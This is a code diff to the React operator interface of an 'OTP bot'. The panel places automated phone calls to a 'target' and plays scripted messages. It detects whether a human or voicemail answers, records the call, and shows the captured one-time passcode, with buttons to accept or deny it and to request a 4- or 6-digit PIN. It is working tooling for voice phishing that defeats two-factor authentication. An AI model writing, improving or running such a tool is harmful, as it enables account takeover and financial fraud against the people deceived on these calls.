@@ -16,6 +16,7 @@ import {
     CheckCircle2,
     XCircle,
     Play,
+    Pause,
     Copy,
     Download,
     Settings,
@@ -25,7 +26,10 @@ import {
     Hash,
     Volume2,
     Send,
-    ArrowRight
+    TrendingUp,
+    Clock,
+    Mail,
+    Key
 } from 'lucide-react';
 import { toast } from 'sonner';
 import axios from 'axios';
@@ -51,13 +55,19 @@ const OTPBotPage = () => {
     const [socket, setSocket] = useState(null);
     const [logs, setLogs] = useState([]);
     const [sessionId, setSessionId] = useState(null);
+    const [callId, setCallId] = useState(null);
     const [sessionStatus, setSessionStatus] = useState(null);
     const [otpReceived, setOtpReceived] = useState(null);
-    const [otpInput, setOtpInput] = useState('');
+    const [amdResult, setAmdResult] = useState(null);
+    const [callDuration, setCallDuration] = useState(0);
+    const [recordingUrl, setRecordingUrl] = useState(null);
+    const [isPlaying, setIsPlaying] = useState(false);
     const [isCallActive, setIsCallActive] = useState(false);
     const [isLoading, setIsLoading] = useState(false);
     const [currentStep, setCurrentStep] = useState(0);
     const logsEndRef = useRef(null);
+    const audioRef = useRef(null);
+    const durationInterval = useRef(null);
 
     // Form state
     const [config, setConfig] = useState({
@@ -82,6 +92,24 @@ const OTPBotPage = () => {
         logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
     }, [logs]);
 
+    // Duration counter
+    useEffect(() => {
+        if (isCallActive) {
+            durationInterval.current = setInterval(() => {
+                setCallDuration(prev => prev + 1);
+            }, 1000);
+        } else {
+            if (durationInterval.current) {
+                clearInterval(durationInterval.current);
+            }
+        }
+        return () => {
+            if (durationInterval.current) {
+                clearInterval(durationInterval.current);
+            }
+        };
+    }, [isCallActive]);
+
     // Connect to Socket.IO when session starts
     useEffect(() => {
         if (sessionId && !socket) {
@@ -98,13 +126,34 @@ const OTPBotPage = () => {
                 console.log('Log received:', log);
                 setLogs(prev => [...prev, log]);
                 
+                // Handle OTP captured
                 if (log.type === 'otp' && log.data?.otp) {
                     setOtpReceived(log.data.otp);
+                    setSessionStatus('OTP Captured');
                 }
+                
+                // Handle AMD detection
+                if (log.type === 'amd' && log.data?.result) {
+                    setAmdResult(log.data.result);
+                }
+                
+                // Handle recording URL
+                if (log.type === 'recording' && log.data?.url) {
+                    setRecordingUrl(log.data.url);
+                }
+                
+                // Handle call completed
                 if (log.type === 'success' && log.message.includes('completed')) {
                     setIsCallActive(false);
                     setCurrentStep(0);
                 }
+                
+                // Update status based on log type
+                if (log.type === 'ringing') setSessionStatus('Ringing');
+                if (log.type === 'answered') setSessionStatus('Answered');
+                if (log.type === 'busy') setSessionStatus('Busy');
+                if (log.type === 'no_answer') setSessionStatus('No Answer');
+                if (log.type === 'rejected') setSessionStatus('Rejected');
             });
 
             newSocket.on('disconnect', () => {
@@ -133,8 +182,11 @@ const OTPBotPage = () => {
         setIsLoading(true);
         setLogs([]);
         setOtpReceived(null);
-        setOtpInput('');
+        setAmdResult(null);
+        setCallDuration(0);
+        setRecordingUrl(null);
         setCurrentStep(1);
+        setSessionStatus('Initiating');
 
         try {
             const response = await axios.post(`${API}/otp/initiate-call`, config, {
@@ -142,53 +194,15 @@ const OTPBotPage = () => {
             });
 
             setSessionId(response.data.session_id);
+            setCallId(response.data.call_id);
             setIsCallActive(true);
-            setSessionStatus('step1');
-            toast.success('Step 1 call initiated!');
+            setSessionStatus('Calling');
+            toast.success('Call initiated!');
         } catch (error) {
             console.error('Error initiating call:', error);
             toast.error(error.response?.data?.detail || 'Failed to initiate call');
             setCurrentStep(0);
-        } finally {
-            setIsLoading(false);
-        }
-    };
-
-    const handleSendStep2 = async (input = '1') => {
-        if (!sessionId) return;
-        setIsLoading(true);
-
-        try {
-            await axios.post(`${API}/otp/step2/${sessionId}?first_input=${input}`, {}, {
-                headers: getAuthHeaders()
-            });
-            setCurrentStep(2);
-            setSessionStatus('step2');
-            toast.success('Step 2 sent - Waiting for OTP input');
-        } catch (error) {
-            toast.error('Failed to send Step 2');
-        } finally {
-            setIsLoading(false);
-        }
-    };
-
-    const handleSubmitOTP = async () => {
-        if (!sessionId || !otpInput) {
-            toast.error('Please enter OTP code');
-            return;
-        }
-        setIsLoading(true);
-
-        try {
-            await axios.post(`${API}/otp/submit-otp/${sessionId}?otp_code=${otpInput}`, {}, {
-                headers: getAuthHeaders()
-            });
-            setOtpReceived(otpInput);
-            setCurrentStep(3);
-            setSessionStatus('waiting_approval');
-            toast.success('OTP submitted - Waiting for approval');
-        } catch (error) {
-            toast.error('Failed to submit OTP');
+            setSessionStatus(null);
         } finally {
             setIsLoading(false);
         }
@@ -204,7 +218,7 @@ const OTPBotPage = () => {
             });
             toast.success('OTP Accepted - Call completed!');
             setIsCallActive(false);
-            setCurrentStep(0);
+            setSessionStatus('Completed');
         } catch (error) {
             toast.error('Failed to accept');
         } finally {
@@ -222,10 +236,43 @@ const OTPBotPage = () => {
             });
             toast.info('OTP Rejected - Retry message sent');
             setOtpReceived(null);
-            setOtpInput('');
-            setCurrentStep(2);
+            setSessionStatus('Waiting OTP');
         } catch (error) {
             toast.error('Failed to reject');
+        } finally {
+            setIsLoading(false);
+        }
+    };
+
+    const handleRequestPin = async (digits) => {
+        if (!sessionId) return;
+        setIsLoading(true);
+
+        try {
+            await axios.post(`${API}/otp/request-pin/${sessionId}?digits=${digits}`, {}, {
+                headers: getAuthHeaders()
+            });
+            toast.info(`Requesting ${digits}-digit PIN`);
+        } catch (error) {
+            toast.error('Failed to request PIN');
+        } finally {
+            setIsLoading(false);
+        }
+    };
+
+    const handleHangup = async () => {
+        if (!sessionId) return;
+        setIsLoading(true);
+
+        try {
+            await axios.post(`${API}/otp/hangup/${sessionId}`, {}, {
+                headers: getAuthHeaders()
+            });
+            toast.info('Call ended');
+            setIsCallActive(false);
+            setSessionStatus('Ended');
+        } catch (error) {
+            toast.error('Failed to hangup');
         } finally {
             setIsLoading(false);
         }
@@ -247,30 +294,95 @@ const OTPBotPage = () => {
         a.click();
     };
 
+    const toggleRecording = () => {
+        if (audioRef.current) {
+            if (isPlaying) {
+                audioRef.current.pause();
+            } else {
+                audioRef.current.play();
+            }
+            setIsPlaying(!isPlaying);
+        }
+    };
+
+    const formatDuration = (seconds) => {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins}m ${secs}s`;
+    };
+
     const getLogIcon = (type) => {
         switch (type) {
+            case 'ringing': return '📞';
+            case 'answered': return '🤳';
+            case 'amd': return '👤';
+            case 'human': return '👤';
+            case 'silent': return '🔇';
+            case 'voicemail': return '🤖';
+            case 'busy': return '📵';
+            case 'no_answer': return '📵';
+            case 'rejected': return '📴';
             case 'success': return '✅';
             case 'error': return '❌';
             case 'dtmf': return '🔢';
-            case 'otp': return '🕵️';
+            case 'otp': return '🔑';
             case 'call': return '📞';
             case 'step': return '🎙️';
             case 'action': return '⚡';
             case 'warning': return '⚠️';
-            default: return 'ℹ️';
+            case 'info': return 'ℹ️';
+            case 'recording': return '🎤';
+            default: return '📋';
         }
     };
 
     const getLogColor = (type) => {
         switch (type) {
-            case 'success': return 'text-emerald-400';
-            case 'error': return 'text-red-400';
-            case 'dtmf': return 'text-cyan-400';
-            case 'otp': return 'text-amber-400';
-            case 'action': return 'text-violet-400';
-            case 'warning': return 'text-yellow-400';
+            case 'success': 
+            case 'answered':
+            case 'human':
+                return 'text-emerald-400';
+            case 'error': 
+            case 'rejected':
+            case 'busy':
+                return 'text-red-400';
+            case 'ringing':
+                return 'text-blue-400';
+            case 'dtmf': 
+            case 'otp':
+                return 'text-amber-400';
+            case 'amd':
+            case 'warning':
+                return 'text-yellow-400';
+            case 'voicemail':
+                return 'text-purple-400';
+            case 'recording':
+                return 'text-pink-400';
             default: return 'text-gray-300';
         }
+    };
+
+    const getStatusBadge = () => {
+        if (!sessionStatus) return null;
+        
+        const statusColors = {
+            'Initiating': 'bg-blue-500/20 text-blue-400',
+            'Calling': 'bg-blue-500/20 text-blue-400 animate-pulse',
+            'Ringing': 'bg-yellow-500/20 text-yellow-400 animate-pulse',
+            'Answered': 'bg-emerald-500/20 text-emerald-400',
+            'OTP Captured': 'bg-amber-500/20 text-amber-400',
+            'Completed': 'bg-emerald-500/20 text-emerald-400',
+            'Busy': 'bg-red-500/20 text-red-400',
+            'No Answer': 'bg-red-500/20 text-red-400',
+            'Rejected': 'bg-red-500/20 text-red-400',
+            'Ended': 'bg-gray-500/20 text-gray-400',
+        };
+
+        return (
+            <Badge className={statusColors[sessionStatus] || 'bg-gray-500/20 text-gray-400'}>
+                🔑 {sessionStatus}
+            </Badge>
+        );
     };
 
     return (
@@ -288,11 +400,6 @@ const OTPBotPage = () => {
                     <Badge className={`${isCallActive ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-gray-500/20 text-gray-400'}`}>
                         {isCallActive ? '● Active Call' : '○ No Active Call'}
                     </Badge>
-                    {currentStep > 0 && (
-                        <Badge className="bg-violet-500/20 text-violet-400">
-                            Step {currentStep}
-                        </Badge>
-                    )}
                 </div>
             </div>
 
@@ -421,6 +528,23 @@ const OTPBotPage = () => {
                                     </SelectContent>
                                 </Select>
                             </div>
+
+                            {/* Action Button */}
+                            <div className="pt-4">
+                                <Button
+                                    onClick={handleInitiateCall}
+                                    disabled={isLoading || isCallActive}
+                                    data-testid="initiate-call-btn"
+                                    className="w-full bg-violet-600 hover:bg-violet-700 glow-primary"
+                                >
+                                    {isLoading ? (
+                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-2" />
+                                    ) : (
+                                        <Play className="w-4 h-4 mr-2" />
+                                    )}
+                                    {isCallActive ? 'Call in Progress' : 'Start Call'}
+                                </Button>
+                            </div>
                         </CardContent>
                     </Card>
 
@@ -447,7 +571,7 @@ const OTPBotPage = () => {
                                     <Textarea
                                         value={config.step1_message}
                                         onChange={(e) => setConfig({...config, step1_message: e.target.value})}
-                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
+                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                     />
                                 </TabsContent>
 
@@ -456,7 +580,7 @@ const OTPBotPage = () => {
                                     <Textarea
                                         value={config.step2_message}
                                         onChange={(e) => setConfig({...config, step2_message: e.target.value})}
-                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
+                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                     />
                                 </TabsContent>
 
@@ -465,7 +589,7 @@ const OTPBotPage = () => {
                                     <Textarea
                                         value={config.step3_message}
                                         onChange={(e) => setConfig({...config, step3_message: e.target.value})}
-                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
+                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                     />
                                 </TabsContent>
 
@@ -474,7 +598,7 @@ const OTPBotPage = () => {
                                     <Textarea
                                         value={config.accepted_message}
                                         onChange={(e) => setConfig({...config, accepted_message: e.target.value})}
-                                        className="bg-[#0F111A] border-emerald-500/30 min-h-[100px] text-sm"
+                                        className="bg-[#0F111A] border-emerald-500/30 min-h-[80px] text-sm"
                                     />
                                 </TabsContent>
 
@@ -483,145 +607,149 @@ const OTPBotPage = () => {
                                     <Textarea
                                         value={config.rejected_message}
                                         onChange={(e) => setConfig({...config, rejected_message: e.target.value})}
-                                        className="bg-[#0F111A] border-red-500/30 min-h-[100px] text-sm"
+                                        className="bg-[#0F111A] border-red-500/30 min-h-[80px] text-sm"
                                     />
                                 </TabsContent>
                             </Tabs>
-
-                            {/* Action Button */}
-                            <div className="mt-6">
-                                <Button
-                                    onClick={handleInitiateCall}
-                                    disabled={isLoading || isCallActive}
-                                    data-testid="initiate-call-btn"
-                                    className="w-full bg-violet-600 hover:bg-violet-700 glow-primary"
-                                >
-                                    {isLoading ? (
-                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-2" />
-                                    ) : (
-                                        <Play className="w-4 h-4 mr-2" />
-                                    )}
-                                    {isCallActive ? 'Call in Progress' : 'Initiate Call (Step 1)'}
-                                </Button>
-                            </div>
                         </CardContent>
                     </Card>
                 </div>
 
-                {/* Right Column - Live Status & Logs */}
+                {/* Right Column - Current Call Status & Logs */}
                 <div className="space-y-6">
-                    {/* Call Control Panel */}
+                    {/* Current Call Status Card */}
                     <Card className="bg-[#12141F] border-white/5">
-                        <CardHeader className="pb-4">
-                            <CardTitle className="text-lg">Call Control Panel</CardTitle>
+                        <CardHeader className="pb-2">
+                            <div className="flex items-center justify-between">
+                                <CardTitle className="text-lg flex items-center gap-2">
+                                    <TrendingUp className="w-5 h-5 text-emerald-400" />
+                                    Current Call Status
+                                </CardTitle>
+                                {isCallActive && (
+                                    <div className="flex gap-2 flex-wrap">
+                                        <Button
+                                            onClick={handleAccept}
+                                            disabled={isLoading || !otpReceived}
+                                            size="sm"
+                                            className="bg-emerald-600 hover:bg-emerald-700"
+                                        >
+                                            <CheckCircle2 className="w-3 h-3 mr-1" />
+                                            Accept OTP
+                                        </Button>
+                                        <Button
+                                            onClick={handleReject}
+                                            disabled={isLoading || !otpReceived}
+                                            size="sm"
+                                            variant="destructive"
+                                        >
+                                            <XCircle className="w-3 h-3 mr-1" />
+                                            Deny OTP
+                                        </Button>
+                                        <Button
+                                            onClick={() => handleRequestPin(4)}
+                                            disabled={isLoading}
+                                            size="sm"
+                                            className="bg-amber-600 hover:bg-amber-700"
+                                        >
+                                            <Key className="w-3 h-3 mr-1" />
+                                            PIN 4
+                                        </Button>
+                                        <Button
+                                            onClick={() => handleRequestPin(6)}
+                                            disabled={isLoading}
+                                            size="sm"
+                                            className="bg-amber-600 hover:bg-amber-700"
+                                        >
+                                            <Key className="w-3 h-3 mr-1" />
+                                            PIN 6
+                                        </Button>
+                                    </div>
+                                )}
+                            </div>
                         </CardHeader>
-                        <CardContent>
-                            {!isCallActive ? (
-                                <div className="flex flex-col items-center justify-center py-8 text-gray-500">
-                                    <PhoneCall className="w-16 h-16 opacity-30 mb-4" />
+                        <CardContent className="space-y-4">
+                            {!isCallActive && !sessionId ? (
+                                <div className="text-center py-8 text-gray-500">
+                                    <PhoneCall className="w-12 h-12 mx-auto opacity-30 mb-3" />
                                     <p>No active call</p>
                                     <p className="text-sm">Start a call to begin</p>
                                 </div>
                             ) : (
-                                <div className="space-y-4">
-                                    {/* Step 1 -> Step 2 */}
-                                    {currentStep === 1 && (
-                                        <div className="p-4 rounded-lg bg-blue-500/10 border border-blue-500/30">
-                                            <p className="text-sm text-blue-400 mb-3">Step 1 complete. What did target press?</p>
-                                            <div className="flex gap-2">
-                                                <Button
-                                                    onClick={() => handleSendStep2('1')}
-                                                    className="flex-1 bg-blue-600 hover:bg-blue-700"
-                                                    disabled={isLoading}
-                                                >
-                                                    Pressed 1
-                                                </Button>
-                                                <Button
-                                                    onClick={() => handleSendStep2('0')}
-                                                    variant="outline"
-                                                    className="flex-1"
-                                                    disabled={isLoading}
-                                                >
-                                                    Pressed 0
-                                                </Button>
-                                            </div>
+                                <div className="space-y-3">
+                                    <div className="grid grid-cols-2 gap-4">
+                                        <div className="space-y-1">
+                                            <p className="text-xs text-gray-500 uppercase">Call ID</p>
+                                            <p className="font-mono text-sm text-gray-300 truncate">
+                                                {callId || '-'}
+                                            </p>
                                         </div>
-                                    )}
-
-                                    {/* Step 2 - OTP Input */}
-                                    {currentStep === 2 && (
-                                        <div className="p-4 rounded-lg bg-cyan-500/10 border border-cyan-500/30">
-                                            <p className="text-sm text-cyan-400 mb-3">Step 2 playing. Enter OTP from target:</p>
-                                            <div className="flex gap-2">
-                                                <Input
-                                                    value={otpInput}
-                                                    onChange={(e) => setOtpInput(e.target.value.replace(/\D/g, ''))}
-                                                    placeholder={`Enter ${config.otp_digits} digit OTP`}
-                                                    maxLength={config.otp_digits}
-                                                    className="bg-[#0F111A] border-cyan-500/30 font-mono text-xl text-center tracking-widest"
-                                                    data-testid="otp-input"
-                                                />
-                                                <Button
-                                                    onClick={handleSubmitOTP}
-                                                    disabled={isLoading || otpInput.length < config.otp_digits}
-                                                    className="bg-cyan-600 hover:bg-cyan-700"
-                                                >
-                                                    <Send className="w-4 h-4" />
-                                                </Button>
-                                            </div>
+                                        <div className="space-y-1">
+                                            <p className="text-xs text-gray-500 uppercase">Status</p>
+                                            {getStatusBadge()}
                                         </div>
-                                    )}
-
-                                    {/* Step 3 - Approval */}
-                                    {currentStep === 3 && otpReceived && (
-                                        <div className="space-y-4">
-                                            <div className="text-center p-6 rounded-lg bg-amber-500/10 border border-amber-500/30">
-                                                <p className="text-sm text-amber-400 mb-2">OTP Received</p>
-                                                <p className="text-4xl font-mono font-bold text-white tracking-widest">
-                                                    {otpReceived}
-                                                </p>
-                                            </div>
-                                            <div className="flex gap-3">
-                                                <Button
-                                                    onClick={handleAccept}
-                                                    data-testid="accept-otp-btn"
-                                                    className="flex-1 bg-emerald-600 hover:bg-emerald-700"
-                                                    disabled={isLoading}
-                                                >
-                                                    <CheckCircle2 className="w-4 h-4 mr-2" />
-                                                    Accept
-                                                </Button>
-                                                <Button
-                                                    onClick={handleReject}
-                                                    data-testid="reject-otp-btn"
-                                                    variant="destructive"
-                                                    className="flex-1"
-                                                    disabled={isLoading}
-                                                >
-                                                    <XCircle className="w-4 h-4 mr-2" />
-                                                    Reject
-                                                </Button>
-                                            </div>
-                                        </div>
-                                    )}
-
-                                    {/* Flow Indicator */}
-                                    <div className="flex items-center justify-center gap-2 pt-4 border-t border-white/10">
-                                        {[1, 2, 3].map((step) => (
-                                            <React.Fragment key={step}>
-                                                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
-                                                    currentStep >= step 
-                                                        ? 'bg-violet-600 text-white' 
-                                                        : 'bg-gray-700 text-gray-400'
-                                                }`}>
-                                                    {step}
-                                                </div>
-                                                {step < 3 && (
-                                                    <ArrowRight className={`w-4 h-4 ${currentStep > step ? 'text-violet-400' : 'text-gray-600'}`} />
-                                                )}
-                                            </React.Fragment>
-                                        ))}
                                     </div>
+
+                                    <div className="grid grid-cols-2 gap-4">
+                                        <div className="space-y-1">
+                                            <p className="text-xs text-gray-500 uppercase">Captured OTP</p>
+                                            <p className="font-mono text-2xl font-bold text-amber-400">
+                                                {otpReceived || '-'}
+                                            </p>
+                                        </div>
+                                        <div className="space-y-1">
+                                            <p className="text-xs text-gray-500 uppercase">Duration</p>
+                                            <p className="font-mono text-lg text-gray-300 flex items-center gap-2">
+                                                <Clock className="w-4 h-4" />
+                                                {formatDuration(callDuration)}
+                                            </p>
+                                        </div>
+                                    </div>
+
+                                    <div className="grid grid-cols-2 gap-4">
+                                        <div className="space-y-1">
+                                            <p className="text-xs text-gray-500 uppercase">AMD Result</p>
+                                            <Badge className={`${
+                                                amdResult === 'HUMAN' ? 'bg-emerald-500/20 text-emerald-400' :
+                                                amdResult === 'VOICEMAIL' ? 'bg-purple-500/20 text-purple-400' :
+                                                'bg-gray-500/20 text-gray-400'
+                                            }`}>
+                                                {amdResult || 'Detecting...'}
+                                            </Badge>
+                                        </div>
+                                        <div className="space-y-1">
+                                            <p className="text-xs text-gray-500 uppercase">Recording</p>
+                                            {recordingUrl ? (
+                                                <div className="flex items-center gap-2">
+                                                    <audio ref={audioRef} src={recordingUrl} onEnded={() => setIsPlaying(false)} />
+                                                    <Button 
+                                                        size="sm" 
+                                                        variant="outline"
+                                                        onClick={toggleRecording}
+                                                        className="text-pink-400 border-pink-500/30"
+                                                    >
+                                                        {isPlaying ? <Pause className="w-3 h-3 mr-1" /> : <Play className="w-3 h-3 mr-1" />}
+                                                        {isPlaying ? 'Pause' : 'Play'}
+                                                    </Button>
+                                                </div>
+                                            ) : (
+                                                <p className="text-sm text-gray-500">Not available</p>
+                                            )}
+                                        </div>
+                                    </div>
+
+                                    {isCallActive && (
+                                        <div className="pt-2">
+                                            <Button
+                                                onClick={handleHangup}
+                                                disabled={isLoading}
+                                                variant="destructive"
+                                                className="w-full"
+                                            >
+                                                <PhoneOff className="w-4 h-4 mr-2" />
+                                                End Call
+                                            </Button>
+                                        </div>
+                                    )}
                                 </div>
                             )}
                         </CardContent>
@@ -635,11 +763,13 @@ const OTPBotPage = () => {
                                 Live Call Log
                             </CardTitle>
                             <div className="flex gap-2">
-                                <Button variant="ghost" size="sm" onClick={copyLogs} className="text-gray-400 hover:text-white">
-                                    <Copy className="w-4 h-4" />
+                                <Button variant="outline" size="sm" onClick={copyLogs} className="text-gray-400 hover:text-white border-white/10">
+                                    <Copy className="w-4 h-4 mr-1" />
+                                    Copy
                                 </Button>
-                                <Button variant="ghost" size="sm" onClick={exportLogs} className="text-gray-400 hover:text-white">
-                                    <Download className="w-4 h-4" />
+                                <Button variant="outline" size="sm" onClick={exportLogs} className="text-gray-400 hover:text-white border-white/10">
+                                    <Download className="w-4 h-4 mr-1" />
+                                    Export
                                 </Button>
                             </div>
                         </CardHeader>
